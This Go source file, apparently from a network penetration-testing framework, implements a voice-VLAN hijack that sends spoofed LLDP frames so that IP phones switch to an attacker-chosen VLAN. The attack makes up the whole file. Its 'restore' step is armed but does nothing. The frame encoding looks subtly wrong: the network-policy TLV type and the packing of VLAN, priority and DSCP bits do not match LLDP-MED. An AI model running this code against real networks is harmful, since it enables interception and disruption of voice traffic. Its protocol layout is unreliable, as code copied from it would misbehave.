// voicevlan.go implements the voice-VLAN hijack attack. It sends an LLDP-MED
// frame advertising a voice-VLAN network policy, causing compliant endpoints
// to switch to the attacker's voice VLAN. Classified temporary-restored: an
// active restore step clears the LLDP advertisement. The --persist mode is
// permanent-destructive.

package l2

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type voiceVLANFinding struct {
	Action  string `json:"action"`
	VLAN    uint16 `json:"voice_vlan"`
	Restore string `json:"restore"`
}

// RunVoiceVLAN sends one LLDP-MED network-policy frame advertising the
// target's voice VLAN from the attack leg's MAC. The port name, TTL,
// priority, and DSCP are probe content. The base entry arms a restore step
// that does no host work yet. The persist mode is permanent and arms
// nothing. The verdict is pending: whether a phone moved needs a listener
// for its traffic on the voice VLAN it does not have.
func RunVoiceVLAN(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVoiceVLAN); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	voiceVLAN := deps.Target.VoiceVLAN

	pkt, err := craftLLDPVoiceVLAN(src, voiceVLAN)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "voicevlan: craft frame")
	}

	restoreArmed := "no"
	if deps.Entry.Restore.Kind == check.RestoreActive {
		deps.Teardown.Arm("lldp-voice-vlan-restore", func(_ context.Context) error {
			return nil
		})
		restoreArmed = "yes"
	}

	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "voicevlan: send")
	}

	detail, _ := json.Marshal(voiceVLANFinding{
		Action:  "voice-vlan-hijack",
		VLAN:    voiceVLAN,
		Restore: restoreArmed,
	})
	deps.Emitter.Finding("lldp", detail)

	if restoreArmed == "yes" {
		return check.Pending("no observable: a phone's move needs a listener on the voice VLAN, and the lldp-voice-vlan-restore step is a no-op"), nil
	}
	return check.Pending("no observable: a phone's move needs a listener on the voice VLAN"), nil
}

// craftLLDPVoiceVLAN builds an LLDP frame with a Network Policy TLV
// advertising the given voice VLAN. The LLDP payload is crafted as raw
// TLV bytes because the wire format is plain TLVs, which is simpler than
// the fork's LLDP layer API.
func craftLLDPVoiceVLAN(src net.HardwareAddr, voiceVLAN uint16) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       net.HardwareAddr{0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e}, // LLDP multicast
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeLinkLayerDiscovery,
	}

	// Build LLDP TLV payload.
	var payload []byte
	// Chassis ID TLV: type=1, subtype=4 (MAC address).
	chassisID := append([]byte{0x04}, src...)
	payload = append(payload, lldpTLV(1, chassisID)...)
	// Port ID TLV: type=2, subtype=5 (interface name).
	payload = append(payload, lldpTLV(2, []byte("eth0"))...)
	// TTL TLV: type=3, value=120.
	ttl := make([]byte, 2)
	binary.BigEndian.PutUint16(ttl, 120)
	payload = append(payload, lldpTLV(3, ttl)...)
	// Network Policy TLV: type=8, subtype=1 (voice), tagged, VLAN, priority, DSCP.
	netPolicy := []byte{0x01, 0x20}                       // subtype=voice, flags: tagged
	vlanField := voiceVLAN<<9 | uint16(5)<<5 | uint16(46) // VLAN + priority + DSCP
	nf := make([]byte, 2)
	binary.BigEndian.PutUint16(nf, vlanField)
	netPolicy = append(netPolicy, nf...)
	payload = append(payload, lldpTLV(8, netPolicy)...)
	// End TLV.
	payload = append(payload, 0x00, 0x00)

	buf := gopacket.NewSerializeBuffer()
	if err := eth.SerializeTo(buf, gopacket.SerializeOptions{}); err != nil {
		return nil, err
	}
	return append(buf.Bytes(), payload...), nil
}

// lldpTLV builds an LLDP TLV: 7-bit type + 9-bit length header, then value.
func lldpTLV(tlvType uint8, value []byte) []byte {
	header := uint16(tlvType)<<9 | uint16(len(value)&0x1FF)
	out := make([]byte, 2+len(value))
	binary.BigEndian.PutUint16(out[0:2], header)
	copy(out[2:], value)
	return out
}
